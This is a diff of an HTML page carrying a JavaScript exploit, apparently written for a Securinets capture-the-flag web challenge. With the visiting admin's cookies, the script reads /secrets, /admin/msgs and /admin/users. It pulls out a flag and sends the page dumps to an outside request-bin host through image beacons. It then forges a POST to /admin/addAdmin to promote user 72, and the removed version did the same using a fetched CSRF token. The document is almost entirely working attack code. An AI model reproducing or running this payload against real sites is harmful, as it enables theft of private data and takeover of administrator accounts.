@@ -1,38 +1,49 @@
-<!doctype html><meta charset="utf-8"><title>promote</title>
+<!doctype html><meta charset="utf-8"><title>probe</title>
 <script>
 (async ()=>{
-  const V = 'http://web1-79e4a3bc.p1.securinets.tn';
+  const V = 'http://web1-79e4a3bc.p1.securinets.tn';   
+  const LEAK = 'https://ocyhewo.request.dreamhack.games'; 
+  const ME = (m)=>{ new Image().src = LEAK + '/?d=' + encodeURIComponent(m); };
 
-  let t = '';
+  ME('start');
+
+  let canRead = false, html = '';
   try {
-    const r = await fetch(V+'/csrf-token', {credentials:'include'});
-    t = (await r.json()).csrfToken;
-  } catch(e) {}
-
-  const ATTACKER_ID = 72;   
-  if (t) {
-    await fetch(V+'/admin/addAdmin', {
-      method: 'POST',
-      credentials: 'include',
-      headers: {'Content-Type':'application/json', 'CSRF-Token': t},
-      body: JSON.stringify({ userId: ATTACKER_ID })
-    });
-  }
-  if (!t) {
-    try {
-      const r = await fetch(V+'/csrf-token', {credentials:'include'});
-      t = (await r.json()).csrfToken;
-    } catch(e){}
-    if (t) {
-      const params = new URLSearchParams({_csrf:t, userId:String(ATTACKER_ID)});
-      await fetch(V+'/admin/addAdmin', {
-        method:'POST', credentials:'include',
-        headers:{'Content-Type':'application/x-www-form-urlencoded'},
-        body: params.toString()
-      });
+    const r = await fetch(V + '/admin/users', { credentials: 'include' });
+    html = await r.text();
+    if (html.includes('<table') || html.includes('Users') || html.length > 200) {
+      canRead = true;
     }
+  } catch(e){}
+
+  if (canRead) {
+    const pages = ['/secrets','/admin/msgs','/admin/users'];
+    let dump = '';
+    for (const p of pages) {
+      try {
+        const r = await fetch(V+p, { credentials:'include' });
+        dump += '\n\n===== '+p+' =====\n' + await r.text();
+      } catch(e){}
+    }
+    const m = dump.match(/(CTF|FLAG)\{[^}]+\}/i);
+    if (m) { ME('flag='+m[0]); return; }
+    ME('dump='+dump.slice(0,1800));
+    return;
   }
 
-  new Image().src='https://xqimudd.request.dreamhack.games/?d=promoted';
+  ME('cant-read'); 
+
+  const ATTACKER_ID = 72; 
+  const f = document.createElement('form');
+  f.method = 'POST';
+  f.action = V + '/admin/addAdmin';
+  f.target = '_self';
+  const a = document.createElement('input'); a.name='userId'; a.value=String(ATTACKER_ID);
+  f.appendChild(a);
+  document.body.appendChild(f);
+  ME('try-post-no-csrf');
+  f.submit();
+
+  setTimeout(()=>ME('maybe-promoted'), 3000);
 })();
 </script>
